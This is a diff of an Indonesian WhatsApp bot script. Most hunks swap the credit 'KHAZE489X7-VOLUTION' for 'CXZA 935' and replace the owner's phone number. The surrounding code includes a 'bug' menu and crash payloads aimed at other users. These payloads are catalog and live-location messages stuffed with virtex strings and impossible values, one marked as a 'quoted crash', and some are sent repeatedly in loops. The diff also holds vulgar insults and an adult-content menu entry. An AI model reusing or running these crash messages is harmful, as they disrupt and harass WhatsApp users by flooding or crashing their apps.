-*CXZA 935*`
+*© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓*`
 reply(`${result4}`)
 haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : hw }).catch ((err) => reply('*Failed to download File*'))
 }
@@ -3939,7 +3909,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ ownermenu
 └❒ bugmenu
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓
 `,
 }
 }}}), { userJid: m.chat, quoted: m })
@@ -3955,7 +3925,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hola ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 -
+"description": ` - © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 -
 
 ┌❑ *INFORMATION* ❑
 ├❒ Owner : ${botname}
@@ -3972,10 +3942,10 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
-"url": "wa.me/6285775422460"
+"retailerId": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
+"url": "wa.me/6283149877456"
 },  
-"businessOwnerJid": "6285775422460@s.whatsapp.net",
+"businessOwnerJid": "6283149877456@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: hw })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -4016,7 +3986,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ kesel
 └❒ ngeselin
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4068,7 +4038,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ delttt
 └❒ suitpvp [@tag]
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4197,7 +4167,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ catalogpc > 628xxx@s.whatsapp.net|10|10s 
 └❒ cataloggc > 1237891xxxx@g.us|10|10s
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 `,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 `,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4257,7 +4227,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ zodiak
 └❒ shio
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4292,7 +4262,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ juzamma
 └❒ tafsirsurah
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4337,7 +4307,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ cnn-news
 └❒ fajar-news 
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4390,7 +4360,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ penjara
 └❒ intro
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4431,7 +4401,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ slow
 └❒ tupai
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4472,7 +4442,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ cecan
 └❒ bokep
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4511,7 +4481,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ ringtone [query]
 └❒ searchgroups [query]
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4559,7 +4529,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ styletext
 └❒ ss [url]
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4598,7 +4568,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ getmsg
 └❒ delmsg
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4634,7 +4604,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ getvideo [query]
 └❒ mediafire [url]
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4686,7 +4656,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ listonline
 └❒ speedtest
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4755,7 +4725,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ├❒ meme
 └❒ meme2
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4789,7 +4759,7 @@ sound159
 sound160
 sound161
 
-© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4873,7 +4843,7 @@ for (let i = 0; i < jumlah; i++) {
 ]
 
 const buttonMessage = {
-    text: "BUG BY CXZA 935",
+    text: "BUG © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓",
     footerText: 'Pe',
     buttons: buttons,
     headerType: 1
@@ -4894,18 +4864,18 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "99999999999999",
-"title": `🔥 CXZA 935 CATALOG 🔥 ${buttonvirus}`,
-"description": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 CATALOG ${buttonvirus}`,
+"title": `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 CATALOG 🔥 ${buttonvirus}`,
+"description": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 CATALOG ${buttonvirus}`,
 "currencyCode": "IDR",
-"footerText": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 CATALOG`,
+"footerText": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 CATALOG`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `CXZA 935`,
-"url": "wa.me/6285775422460"
+"retailerId": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
+"url": "wa.me/6283149877456"
 },
-"businessOwnerJid": "6285775422460@s.whatsapp.net",
+"businessOwnerJid": "6283149877456@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: ctlg })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -4927,19 +4897,19 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productId": "KONTOL",
 "fileLength": "99999999999",
 "jpegThumbnail": mekih,
-"title": `BY CXZA 935`,
+"title": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "description": `💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤${virtex2}`,
 "currencyCode": "IDR",
 "productImageCount": 923456789,
 "firstImageId": 1,
 "priceAmount1000": "999",
 "salePriceAmount1000": "IDR 99.99999999999999999999",  
-"bodyText": `CXZA 935`,
-"footerText": `CXZA 935`,
+"bodyText": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
+"footerText": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 "retailerId": `CATALOG NEW`,
 "url": "https://youtube.com/channel/YRxchSagDYGdgvcasyjjbEWECdf"
 },
-"businessOwnerJid": "6285775422460@s.whatsapp.net",
+"businessOwnerJid": "6283149877456@s.whatsapp.net",
 "contextInfo": {
 "forwardingScore": 150,
 "isForwarded": true
@@ -4957,14 +4927,14 @@ jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 des = [
 {
-title: `BUG LIST BY CXZA 935`,
+title: `BUG LIST © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
  rows: [
 {title: virtex1, rowId: `Cxza`, description: `KONTOL BAPAK KAU`},
 {title: virtex2, rowId: `935`, description: `MEMEK MAMAK KAU`},
 ]
 }
 ]
-haikal.sendListMsg(m.chat, `CXZA 935\n${philips}`, haikal.user.name, `CXZA 935`, `CXZA 935\n-${jobot}`, des, shield2)
+haikal.sendListMsg(m.chat, `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\n${philips}`, haikal.user.name, `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\n-${jobot}`, des, shield2)
 }
 }
 break
@@ -4999,7 +4969,7 @@ res = generateWAMessageFromContent(m.chat,{
 "liveLocationMessage": {
 "degreesLatitude": -7.8374838,
 "degreesLongitude": 727.8383838,
-"caption": `CXZA 935 \n\n${philips} ${virtex3}`,
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 \n\n${philips} ${virtex3}`,
 "sequenceNumber": "1532280505",
 "thumbnail": mekih,
 "contextInfo": {
@@ -5012,7 +4982,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
 liveLocationMessage: {
-caption: `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+caption: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
@@ -5030,7 +5000,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 	"liveLocationMessage": {
 						"degreesLatitude": -6.9366881,
 						"degreesLongitude": 107.7228148,
-						"caption": `BY CXZA 935 ${philips} ${ngazap(prefix)}`,
+						"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${philips} ${ngazap(prefix)}`,
 						"sequenceNumber": "1657997490287001",
 						"jpegThumbnail": "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"
 }
@@ -5047,7 +5017,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 	"liveLocationMessage": {
 						"degreesLatitude": -6.9366881,
 						"degreesLongitude": 107.7228148,
-						"caption": `BY CXZA 935 ${philips} ${ngazap(prefix)}`,
+						"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${philips} ${ngazap(prefix)}`,
 						"sequenceNumber": "1657997490287001",
 						"jpegThumbnail": "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